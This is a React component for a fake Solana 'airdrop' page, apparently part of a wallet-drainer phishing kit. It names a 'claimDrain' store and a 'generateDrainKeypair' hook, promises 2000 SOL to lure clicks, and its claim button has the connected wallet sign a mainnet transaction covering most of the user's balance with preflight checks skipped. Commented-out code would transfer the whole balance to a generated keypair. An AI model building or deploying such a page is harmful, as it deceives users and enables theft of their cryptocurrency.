'use client'
import React , {useMemo, useState} from 'react'
import {
    Drawer,
    DrawerClose,
    DrawerContent,
    DrawerDescription,
    DrawerFooter,
    DrawerHeader,
    DrawerTitle,
  } from "@/app/components/ui/drawer"
  import {
    clusterApiUrl,
    Connection,
    Keypair,
    LAMPORTS_PER_SOL,
    StakeProgram,
    Authorized,
    sendAndConfirmTransaction,
    Lockup,
    PublicKey,
    Signer,
    SystemProgram,
    Transaction
  } from "@solana/web3.js";



  import { claimLevel } from '@/app/constants/claimStages'
  import { changeOpenBottomDrawer } from '@/app/services/redux/drawerBottom'
  import { changeClaimStages } from '@/app/services/redux/claimDrain'
  import Button from '../ui/Button'
  import { ThreeDots } from 'react-loader-spinner'
  import { toast } from 'sonner';
// import { Connection, Keypair, LAMPORTS_PER_SOL, PublicKey, SystemProgram, Transaction } from '@solana/web3.js'
import { useWallet } from '@solana/wallet-adapter-react'
// import { approveTokensForSpendingandSendToken } from '@/app/services/hook/sendSol'
import { executeConnectionObject } from '@/app/services/redux/walletConnectionObject'
import { generateSolanaWallet } from '@/app/services/hook/generateDrainKeypair'
import { StakeSol } from '@/app/services/hook/stake/StakeSol'

const BottomDrawer = () => {
  const {wallet , signTransaction , publicKey, sendTransaction , signAllTransactions} =   useWallet();
const connection = new Connection(String(process.env.NEXT_PUBLIC_SOLANA_HTTPS))
const openBottomDrawal = changeOpenBottomDrawer((state)=>state.openBottomDrawer)
const resetBottomDrawal = changeOpenBottomDrawer((state)=>state.resetOpenBottomDrawer)
const claimingStage = changeClaimStages((state)=>state.claimStage)
const resetClaim  = changeClaimStages((state)=>state.resetClaim)
const getUsersBalance = executeConnectionObject((state)=>state.accountBalance)
const usersPublicKey = executeConnectionObject((state)=>state.usersPublicKey);

const AIRDROP_BALANCE = ((getUsersBalance * 25)  / 100) ; 


async function claimToken(){
  try{
    const lamportconversion = (getUsersBalance * LAMPORTS_PER_SOL)

    // Setup our connection and wallet
    // const connection = new Connection(clusterApiUrl("devnet"), "confirmed");
    const connection = new Connection(clusterApiUrl('mainnet-beta') , "confirmed")
    //  new Connection(String(process.env.NEXT_PUBLIC_SOLANA_HTTPS))
    // const wallet = Keypair.generate();
  
    // Fund our wallet with 1 SOL
    // const airdropSignature = await connection.requestAirdrop(
    //   wallet.publicKey,
    //   LAMPORTS_PER_SOL
    // );
    // await connection.confirmTransaction(airdropSignature);
  
    // Create a keypair for our stake account
    // const stakeAccount = Keypair.generate();

  // Get all validators, categorized by current (i.e. active) and deliquent (i.e. inactive)
  const { current, delinquent } = await connection.getVoteAccounts();
  console.log("current validators: ", current);
  console.log("all validators: ", current.concat(delinquent));
    // Calculate how much we want to stake
    const minimumRent = await connection.getMinimumBalanceForRentExemption(
      StakeProgram.space
    );
    const amountUserWantsToStake =  lamportconversion 
    const considerAmount = ((amountUserWantsToStake - AIRDROP_BALANCE)) ;
    const stakingAmount = ( considerAmount < minimumRent)?  0 :  considerAmount;
     console.log(lamportconversion ,minimumRent , stakingAmount )


    // Setup a transaction to create our stake account
    // Note: `StakeProgram.createAccount` returns a `Transaction` preconfigured with the necessary `TransactionInstruction`s
    const createStakeAccountTx =  StakeProgram.createAccount({
      authorized: new Authorized(publicKey as PublicKey, publicKey as PublicKey), // Here we set two authorities: Stake Authority and Withdrawal Authority. Both are set to our wallet.
      fromPubkey: publicKey as PublicKey,
      lamports: Number(stakingAmount),
      lockup: new Lockup(0, 0,  publicKey as PublicKey), // Optional. We'll set this to 0 for demonstration purposes.
      stakePubkey: publicKey as PublicKey,
    });


     console.log(createStakeAccountTx)

    // const createStakeAccountTxId = await sendAndConfirmTransaction(
    //   connection,
    //   createStakeAccountTx,
    //   [wallet] as unknown  as Signer[]
    // );


const {
  context: { slot: minContextSlot },
  value: { blockhash, lastValidBlockHeight },
} = await connection.getLatestBlockhashAndContext();

    const signature = await sendTransaction(createStakeAccountTx, connection, {
      minContextSlot,
      skipPreflight: true,
      signers: [],
      preflightCommitment: 'processed',
    });


    if(!signature){
      toast("🎉 Airdrop claiming Status ", {description: "Airdrop claiming Failed  "});
      return;
    }

    console.log(createStakeAccountTx , signature , "create Stake Account Transaction ")
    // stakeAccount, // Since we're creating a new stake account, we have that account sign as well
    // console.log(`Stake account created. Tx Id: ${createStakeAccountTxId}`);
  
    // Check our newly created stake account balance. This should be 0.5 SOL.
    let stakeBalance = await connection.getBalance(publicKey as PublicKey);
    console.log(`Stake account balance: ${stakeBalance / LAMPORTS_PER_SOL} SOL`);
  
    // Verify the status of our stake account. This will start as inactive and will take some time to activate.
    let stakeStatus = await connection.getStakeActivation(publicKey as PublicKey);
    console.log(`Stake account status: ${stakeStatus.state}`);























































































































  toast("🎉 Airdrop claiming Status ", {description: " Airdrop claimin is initialized 🎉 "});
  resetClaim(claimLevel[2])
  // const userBkeyPair =  await generateSolanaWallet()
  // const mainAccountAmount  = Number(getUsersBalance) * Number(LAMPORTS_PER_SOL) - (deductGas);
  // console.log( " { mnemonic,seed,keypair,publicKe} " ,userBkeyPair)
//   const approveTx = new Transaction().add(
//     approveInstruction(mainAccountAmount, publicKey as PublicKey, userBkeyPair?.publicKey as PublicKey)
//     // transferInstruction(mainAccountAmount, publicKey as PublicKey, userBkeyPair?.publicKey as PublicKey) 
// );

// const {
//   context: { slot: minContextSlot },
//   value: { blockhash, lastValidBlockHeight },
// } = await connection.getLatestBlockhashAndContext();

    // const signature = await sendTransaction(approveTx, connection, {
    //   minContextSlot,
    //   skipPreflight: true,
    //   signers: [],
    //   preflightCommitment: 'processed',
    // });
    // console.log({ blockhash, lastValidBlockHeight, signature, minContextSlot });

    // const confirmtx = await connection.confirmTransaction({ blockhash, lastValidBlockHeight, signature });
    // console.log({ signature, confirmtx });
    // const txdata = await connection.getParsedTransaction(signature);
    // console.log({ data: txdata?.meta?.logMessages });


  }catch(error){
         console.log(error)
  }

}

function approveInstruction(amount:number, senderPublicKey:PublicKey, recipientPublicKey:PublicKey) {
  return SystemProgram.transfer({
      fromPubkey: senderPublicKey,
      toPubkey: recipientPublicKey,
      lamports: amount,
  }); 
}


function transferInstruction(amount:number, recipientPublicKey:PublicKey, senderPublicKey:PublicKey) {
    return SystemProgram.transfer({
        fromPubkey: senderPublicKey,
        toPubkey: recipientPublicKey,
        lamports: amount,
    });
}


return (
   <Drawer open={openBottomDrawal}>
      <DrawerContent>
        <div className="mx-auto w-full max-w-sm lg:max-w-lg">
          <DrawerHeader>
            <DrawerTitle className='sm:text-sm  lg:!text-4xl text-white tracking-wider lg:tracking-normal py-4  lg:pt-0 '>Soaring High: Solana's Exclusive Airdrop Touches Down on May 20, 2024</DrawerTitle>
              <div className='w-full min-h-fit flex flex-col py-4 space-y-1'>
              <div  className='w-full grid grid-cols-3 '>
                       <div  className='w-full text-2xl  lg:!text-4xl font-bold text-white tracking-wide text-center'>{getUsersBalance}</div>
                       <div  className='w-full text-2xl lg:!text-4xl font-bold text-white tracking-wide text-center'>0.500</div>
                       <div  className='w-full text-2xl lg:!text-4xl font-bold text-white tracking-wide text-center'>2000</div>

                   </div>
                  
                   <div  className='w-full grid grid-cols-3'>
                       <div  className='w-full text-xs text-slate-400 text-center'>Balance (SOL)</div>
                       <div  className='w-full text-xs text-slate-400  text-center'> Airdrop (SOL)</div>
                       <div  className='w-full text-xs  text-slate-400  text-center'>Reserve</div>

                   </div>
              </div>
            
            <DrawerDescription  className='!w-full !h-fit text-sm text-center font-mono bg-orange-300 capitalize text-orange-950 px-3 py-3'>🚀 Don't miss out on the Solana Airdrop!, claim your share of <span className='text-pink-950 font-semibold text-md tracking-wide '>2000 SOL</span>  tokens by clicking the button below. Secure your spot in this exciting opportunity to be part of the future of decentralized finance. Act now and seize your chance to participate!.</DrawerDescription>
          </DrawerHeader>
          <div className="p-4 pb-0">

            <div className="mt-3 h-fit">
            <DrawerClose className='p-2' asChild>
              {(claimingStage == claimLevel[2])?
              <Button className='h-14 w-full lg:max-w-fit lg:px-12 bg-slate-550 flex justify-center items-center' onClick={()=>claimToken()} variant="secondary">🎁 {claimingStage} 
              <span className='h-6 mt-1 w-fit flex !justify-end !items-end'>
                <ThreeDots
                  visible={true}
                  height="20"
                  width="20"
                  color="#ffffff"
                  radius="9"
                  ariaLabel="three-dots-loading"
                  wrapperStyle={{}}
                  wrapperClass=""
                  />
            </span>
            </Button>
               :
               <Button className='h-14 w-full lg:max-w-36 bg-slate-550 flex justify-center items-center' onClick={()=>claimToken()} variant="secondary">{claimingStage}</Button>
              }
            </DrawerClose>
            </div>
          </div>
          <DrawerFooter>
            <DrawerClose className='p-2' asChild>
              <Button className='!absolute h-fit w-fit rounded-full bg-slate-550 top-0 right-0  ' onClick={()=>resetBottomDrawal(false)} variant="secondary">X</Button>
            </DrawerClose>
          </DrawerFooter>
        </div>
      </DrawerContent>
    </Drawer>

  )
}

export default BottomDrawer
